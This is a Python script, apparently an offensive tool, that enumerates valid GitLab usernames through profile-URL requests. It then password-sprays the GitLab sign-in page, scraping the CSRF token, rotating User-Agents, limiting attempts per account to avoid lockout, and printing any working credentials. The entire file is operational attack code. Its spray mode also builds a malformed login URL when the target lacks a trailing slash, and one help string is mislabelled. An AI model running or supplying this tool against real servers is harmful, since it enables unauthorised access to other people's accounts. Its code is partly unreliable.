#!/usr/bin/python3

import argparse
import requests
from bs4 import BeautifulSoup

def main():
    parser = argparse.ArgumentParser(
        description = 'Enumerate Gitlab valid users and perform a Password Spraying Attack.', add_help = True, prefix_chars = '-')
    subparsers = parser.add_subparsers(dest = 'command')
    enum_parser = subparsers.add_parser('enum', help = 'Enumerate Gitlab valid users.')
    enum_parser.add_argument('-U', help = 'User wordlist.', metavar = '<WORDLIST>', required = True)
    enum_parser.add_argument('--proxy', help = 'Web Proxy URL.', metavar = '<URL>')
    enum_parser.add_argument('-A', help = 'Specify a User-Agent', metavar = '<USER-AGENT>')
    enum_parser.add_argument('-t', help = 'Target URL.', metavar = '<URL>', required = True, type = str)
    enum_parser.add_argument('-v', help = 'Verbose.', action = 'store_true', default = False)

    spray_parser = subparsers.add_parser('spray', help = '')
    usergroup = spray_parser.add_mutually_exclusive_group(required = True)
    usergroup.add_argument('-U', help = 'User Wordlist.', metavar = '<WORDLIST>')
    usergroup.add_argument('-u', help = 'Specify a single user.', metavar = '<USER>')
    passgroup = spray_parser.add_mutually_exclusive_group(required = True)
    passgroup.add_argument('-P', help = 'Password Wordlist.', metavar = '<WORDLIST>')
    passgroup.add_argument('-p', help = 'Specify a single user.', metavar = '<PASSWORD>')
    spray_parser.add_argument('-w', type = int, help = 'Number of tries per account.', metavar = '<INT>')
    spray_parser.add_argument('--proxy', help = 'Web Proxy URL.', metavar = '<URL>')
    spray_parser.add_argument('-A', help = 'User-Agent Wordlist.', metavar = '<WORDLIST>')
    spray_parser.add_argument('-t', help = 'Target URL.', metavar = '<URL>', required = True, type = str)
    spray_parser.add_argument('-v', help = 'Verbose.', action = 'store_true', default = False)
    spray_parser.add_argument('-vv', help = 'Verbose 2.', action = 'store_true', default = False)
    args = parser.parse_args()
    
    proxies = {}
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
            }
    headers = {
        'Connection': 'Close'
        }
    if args.A:
        headers.update(
            {'User-Agent': args.A}
            )
    target = args.t

    def get_token(target, headers):
        session = requests.session()
        cookies = session.cookies
        login_url = f'{target}/users/sign_in'
        
        resp = session.get(login_url, headers=headers)
        soup = BeautifulSoup(resp.text, 'html.parser')

        token = soup.find('input', {'name': 'authenticity_token'})['value']

        if args.v:
            print(f'[*]Getting Authenticity Token: {token}')
        if args.vv:
            print(f'[*]Getting Authenticity Token: {token}')
            print(cookies)
        session.close()
        return token, cookies

    #ENUM MODE
    if args.command == 'enum':
        print('[!]Enum Mode Activated!')
        
        with open(args.U, 'r') as w:
            for i in w:
                target = args.t
                user = str(i).strip()
                if target[-1] == '/':
                    target = f'{target}{user}'
                else:
                    target = f'{target}/{user}'
                r = requests.head(target, proxies=proxies, headers=headers)
                if args.v:
                    print(f'[*]Testing {user}')
                if r.status_code == 200:
                    print(f'[+]Valid User Found: {user}')
                elif r.status_code == 0:
                    print('[-]Target is unreachable. Check the target provided!')
    
    #SPRAY MODE
    elif args.command == 'spray':
        print('[!]Spray Mode Activated!')
        if target[-1] == '/':
            login_url = f'{target}users/sign_in'
        else:
            login_url = f'/{target}/users/sign_in'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        useragent_wordlist = []
        if args.A:
            with open(args.A, 'r') as w:
                for i in w:
                    useragent_wordlist.append(str(i).strip())
        username_wordlist = []
        if args.u:
            username_wordlist.append(str(args.u))
        elif args.U:
            with open(args.U, 'r') as w:
                for i in w:
                    username_wordlist.append(str(i).strip())
        password_wordlist = []
        if args.p:
            password_wordlist.append(str(args.p))
        elif args.P:
            with open(args.P, 'r') as w:
                for i in w:
                    password_wordlist.append(str(i).strip())

        k = 0
        w = 1
        for username in username_wordlist:
            c = 0
            token, cookies = get_token(target, headers)
            if args.A:
                headers.update({'User-Agent': useragent_wordlist[k]})
            k += 1
            for password in password_wordlist:
                w += 1
                c += 1
                if args.v:
                    print(f'[*]{username}\'s Lockout Count = {c}')
                    print(f'[*]Testing {username}:{password}')
                if args.vv:
                    print(f'[*]{username}\'s Lockout Count = {c}')
                    print(f'[*]Testing {username}:{password}')
                payload = {
                    'utf8': "✓",
                    'authenticity_token': token,
                    'user[login]': username,
                    'user[password]': password,
                    'user[remember_me]': '0'
                }
                if args.vv:
                    print(payload)
                r = requests.post(login_url, headers=headers,proxies=proxies, data=payload, cookies=cookies, allow_redirects=False)
                if args.vv:
                   print(headers, cookies)
                if r.status_code == 302 and "Invalid Login or password." not in r.text:
                    print(f'[+]VALID CREDENTIALS FOUND - {username}:{password}')
                    exit()
                else:
                    if args.vv:
                        print(r.status_code, r.headers)
                        print(f'[-]Invalid Login - {username}:{password}')
                    if args.v:
                        print(f'[-]Invalid Login - {username}:{password}')
                if c == args.w:
                    break

if __name__ == '__main__':
    main()
